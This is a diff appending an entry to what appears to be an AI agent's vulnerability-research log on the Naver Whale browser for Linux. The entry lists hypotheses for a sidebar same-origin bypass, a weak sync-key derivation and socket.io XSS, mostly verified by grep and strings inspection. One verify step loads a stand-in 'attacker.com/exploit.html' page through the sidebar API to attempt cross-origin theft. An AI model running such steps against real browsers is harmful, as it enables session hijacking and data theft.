@@ -5389,3 +5389,32 @@ testability: HUMAN_ONLY
 [FINAL] 1. Sidebar SOP-bypass regression / iframe sandbox escape on v4.38.386.14 Linux — confidence 70, class OTHER, HUMAN_ONLY
 [FINAL] 2. Sync passphrase KDF + bootstrap-token envelope weak/device-recoverable key on Linux — confidence 62, class AUTH, HUMAN_ONLY
 [NEXT] HUMAN: Deliver official Whale desktop binary v4.38.386.14 (`.deb`) to `/tmp/opencode/whale_binary/` via unrestricted internet. Once delivered: (1) extract libwhale.so; (2) `strings libwhale.so | grep -ciE 'pbkdf|scrypt|iter_count'` — count KDF constants; (3) `strings libwhale.so | grep -ci 'xv10'` — confirm Whale-forked OSCrypt; (4) `grep -c 'sender.origin\|sender.url' <libwhale binary>` — confirm absence of origin check in sidebarAction dispatch; (5) search symbol table for `sync_encryption_bootstrap_token` + `os_crypt` + `whale_need_encryption_key_forced_time`. Zero requests to *.naver.com/sync backend.
+## 2026-08-09 16:23:53 UTC [browser] (model laguna)
+[HYP] Sidebar SOP-bypass regression / iframe sandbox escape on v4.38.386.14 Linux
+class: OTHER
+asset: Whale desktop Linux sidebar (`whale.sidebarAction.show({url})`) + sample extension `translate/src/sidebar-sample/js/background.js`
+confidence: 70
+reasoning: CVE-2025-69234/69235 CPE lists only Windows/macOS; Linux CPE never claimed fixed. Latest v4.38.386.14 (Dec-2025 baseline, never re-assertable passively) is 3 minor versions past v4.35.351.12 fix with 0 CVEs in 2026. Sample extension (5 files all HTTP 200) confirms `content_scripts` match `http://*/*` + `https://*/*` and `onMessage` dispatches `sidebarAction.show`/`show2`/`hide`/`hideAll` from ANY `sendMessage` origin with zero `sender.origin`/`sender.url` inspection; `contentscript.js` fires from `navigator.userAgent.includes('sidebar')===false` branch (any web-page context).
+evidence_needed: Script execution or cross-origin fetch in sidebar panel on Linux; window.opener/parent readback from foreign origin; iframe sandbox escape; CSP bypass via non-http(s) scheme.
+verify_steps: HUMAN_ONLY: `grep -c 'sender.origin\|sender.url' libwhale.so` — must return 0; load sidebar-sample MV2 extension on Whale Linux → `whale.sidebarAction.show({url:'https://attacker.com/exploit.html'})` → attempt cross-origin fetch from panel content script + window.opener readback. Zero requests to `*.naver.com` sync backend.
+impact: SOP bypass / script execution in privileged browser-UI context → cross-origin data theft, session hijacking; Critical if renderer escalation
+testability: HUMAN_ONLY
+[HYP] Sync passphrase KDF + bootstrap-token envelope weak/device-recoverable master-key on Linux
+class: AUTH
+asset: Whale sync client — `os_crypt_whale.cc` fork (xv10 magic), `/whalesync` endpoint, `sync.encryption_bootstrap_token_per_account` prefs, `whale_need_encryption_key_forced_time`
+confidence: 62
+reasoning: Whale-only prefs keys (`sync.encryption_bootstrap_token_per_account` sha256-confirmed in prior binary runs) + Whale-forked OSCrypt (`os_crypt_whale.cc`, `wbc_wrapper_apis.cc`, xv10 magic) + custom `/whalesync` endpoint (NEO_SES cookie auth) deviating from upstream Chromium sync protocol. KDF algorithm/iteration count/salt/master-key storage path unextracted — binary acquisition 100% blocked in-sandbox (cloudfront DNS No-answer, APKMirror 403, Uptodown 404, pstatic 404).
+evidence_needed: PBKDF2/scrypt algorithm + iteration count + salt source + master-key storage path on Linux; bootstrap-token envelope vs upstream Chromium; `whale_need_encryption_key_forced_time` downgrade semantics.
+verify_steps: HUMAN_ONLY: `strings libwhale.so | grep -ciE 'pbkdf|scrypt|iter_count|xv10'` → `grep -c 'sender.origin\|sender.url' <libwhale>` → search symbol table for `sync_encryption_bootstrap_token` + `os_crypt` + `whale_need_encryption_key_forced_time`. Zero requests to `*.naver.com` sync backend.
+impact: Weak KDF / device-recoverable master-key → local attacker/infostealer with profile access decrypts synced passwords/cookies/autofill → full sync account compromise across devices; High
+testability: HUMAN_ONLY
+[HYP] Bundled socket.io.slim.js event-handler injection in Whale resources.pak
+class: XSS
+asset: Whale v4.38.386.14 resources.pak (socket.io.slim.js confirmed Whale-only by prior bigpickle/laguna recon strings)
+confidence: 38
+reasoning: socket.io.slim.js confirmed Whale-only in resources.pak by prior recon; handler implementation suspected runtime-fetched (not statically bundled), degrading passive evidence; no binary re-acquisition possible in-sandbox.
+evidence_needed: Static audit of socket.io.slim.js version + event-handler wiring; whether socket URL is user-influenced; input sanitization in libwhale.so.
+verify_steps: HUMAN_ONLY: extract resources.pak → search socket.io.slim.js → compare version tag → identify event-handler registration for injection.
+impact: Event-handler injection via crafted socket.io payload → XSS in privileged extension context; Critical
+testability: HUMAN_ONLY
+[NEXT] HUMAN: Deliver official Whale desktop binary v4.38.386.14 (`.deb`) to `/tmp/opencode/whale_binary/` via unrestricted internet. Once delivered run: (1) `strings libwhale.so | grep -ciE 'pbkdf|scrypt|iter_count|xv10'`; (2) `grep -c 'sender.origin\|sender.url' libwhale.so`; (3) `nm -D libwhale.so | grep -iE 'sync_encryption_bootstrap_token|os_crypt|whale_need_encryption_key_forced_time'`. Zero requests to `*.naver.com` sync backend.
